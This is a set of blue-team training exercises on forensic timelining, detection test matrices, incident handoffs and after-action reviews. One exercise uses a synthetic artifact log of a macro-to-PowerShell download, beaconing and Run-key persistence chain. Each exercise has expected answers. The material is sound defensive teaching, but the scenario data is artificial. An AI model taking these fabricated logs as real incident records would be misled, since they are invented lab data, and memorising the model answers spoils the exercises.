## BT-21 — Build a forensic timeline from artifacts

**Goal.** Order file, process, and network artifacts and identify the most likely sequence without overclaiming.

**Prerequisites.** BT-02. `sort`, a text editor.

**Steps.** Run these in order and record the output.

1. Create a synthetic artifact CSV.

   ```csv
   timestamp_utc,artifact,host,detail
   2026-10-30T09:59:03Z,process,LAB-WS01,WINWORD.EXE spawned cmd.exe
   2026-10-30T09:59:28Z,process,LAB-WS01,cmd.exe spawned powershell.exe -EncodedCommand
   2026-10-30T09:59:40Z,file,LAB-WS01,C:\Users\lab.user\AppData\Local\Temp\update.exe created
   2026-10-30T10:00:03Z,network,LAB-WS01,update.exe connected to 203.0.113.66:443
   2026-10-30T10:00:44Z,dns,LAB-WS01,cdn.telemetry.example.test resolved
   2026-10-30T10:01:10Z,registry,LAB-WS01,Run key value added for update.exe
   2026-10-30T10:12:00Z,logon,LAB-FS01,lab.user RDP logon from 198.51.100.44
   ```

2. Sort the timeline and identify the earliest and latest events.
3. Mark which events are direct observations and which are inferences.
4. Identify one missing artifact that would change the conclusion.

**Expected reasoning.** The sequence suggests a document-spawned script, a dropped executable, network callbacks, persistence, and a later RDP logon to another host. The registry event is direct evidence of persistence; the RDP logon is direct evidence of access but not proof that the same actor performed it. Missing data could include user interaction, file hash, authentication logs for the RDP session, or a change ticket.

**Prove it.** Save the sorted timeline, a direct-versus-inferred table, and a one-paragraph narrative with confidence.

**Reflect.** Why can two events minutes apart be unrelated? What would you use to establish that the same actor performed both?

## BT-22 — Validate a detection with a test matrix

**Goal.** Test whether a rule fires on the behavior and stays quiet on benign activity.

**Prerequisites.** BT-15 and BT-16. Synthetic events only.

**Steps.** Run these in order and record the output.

1. Choose the certutil rule from BT-15 or write a simple rule for "Office application spawns a shell".
2. Create a test matrix with at least four cases: true positive, benign admin use, renamed binary, and missing log source.
3. For each case, state the expected result, the observed result, and the residual gap.
4. Do not execute real malware or use a production host. Use synthetic events or a safe lab command that prints a marker.

**Expected reasoning.** A rule that fires only on the exact binary name fails the renamed-binary case. A rule that fires on all Office-to-shell behavior may catch malicious macros but also legitimate add-ins. A missing log source is a coverage gap, not a pass. The matrix should make these limits visible.

**Prove it.** Save the matrix and a one-page detection card with scope, known gaps, and response guidance.

**Reflect.** Why is a single true-positive test insufficient? What is the difference between detection coverage and detection efficacy?

## BT-23 — Write an incident handoff

**Goal.** Produce a concise handoff that lets the next analyst act without re-reading everything.

**Prerequisites.** BT-19 or BT-20. A completed decision log.

**Steps.** Run these in order and record the output.

1. Use this structure: incident ID, severity, current status, affected assets, timeline, actions taken, evidence location, open questions, next actions, owner.
2. Separate confirmed facts from hypotheses.
3. Include one "if X then Y" branch for the next shift.
4. Keep it to one page; attach detail rather than copying it.

**Expected reasoning.** A good handoff states what changed, what is uncertain, and what the next person should do first. It avoids blame and speculation. It includes the exact evidence paths and the time zone. It flags decisions that need approval.

**Prove it.** Save the one-page handoff and a redacted evidence index.

**Reflect.** Why is "monitor" a weak next action unless it includes a threshold and an owner? What would you do if the next shift disagrees with your severity?

## BT-24 — Run a lessons-learned review

**Goal.** Turn an incident review into a small number of owned, testable improvements.

**Prerequisites.** BT-23. A completed incident scenario.

**Steps.** Run these in order and record the output.

1. List what happened, what worked, and what did not, without naming individuals as causes.
2. Separate root cause from contributing factors.
3. Write three actions with an owner, due date, success measure, and verification method.
4. Identify one action that would have shortened detection time and one that would have reduced impact.

**Expected reasoning.** "Analyst missed the alert" is not a root cause; "the alert had no runbook and the queue had no severity mapping" is a contributing factor. Good actions are specific: add a tested detection, update a playbook, or fix a logging gap. A due date without an owner is a wish.

**Prove it.** Save a one-page after-action report with a timeline, findings, and an action tracker.

**Reflect.** Why is "add more logging" usually too vague to implement? How would you verify that a corrective action actually reduced risk?

## Set review

You should now be able to:

- Inventory sources and state what each can and cannot answer.
- Build a normalized timeline and separate observation from inference.
- Recognize brute force, spraying, phishing, download-and-execute, beaconing, cloud persistence, and container abuse in synthetic data.
- Map behavior to ATT&CK with evidence and confidence.
- Write a detection rule with explicit false positives and test it against a matrix.
- Run a tabletop and produce a handoff and after-action review.

## References

- [MITRE ATT&CK](https://attack.mitre.org/) — adversary tactics and techniques used for mapping.
- [MITRE D3FEND](https://d3fend.mitre.org/) — defensive countermeasure knowledge base.
- [Sigma](https://github.com/SigmaHQ/sigma) — vendor-neutral detection rule format.
- [NIST SP 800-61r3](https://csrc.nist.gov/pubs/sp/800/61/r3/final) — incident response recommendations aligned to CSF 2.0.
- [SANS SIFT Workstation](https://www.sans.org/tools/sift-workstation/) — free forensic analysis environment.
- [CIS Controls](https://www.cisecurity.org/controls) — prioritized safeguards for detection and response planning.

---

**Related:** [Exercise index](README.md) · [Linux drills](linux-drills.md) · [Networking drills](networking-drills.md) · [Incident response checklist](../checklists/incident-response.md) · [Incident report template](../templates/incident-report.md) · [Repository home](../README.md) · [Ethics](../ETHICS.md)

Last reviewed: 2026-10-31
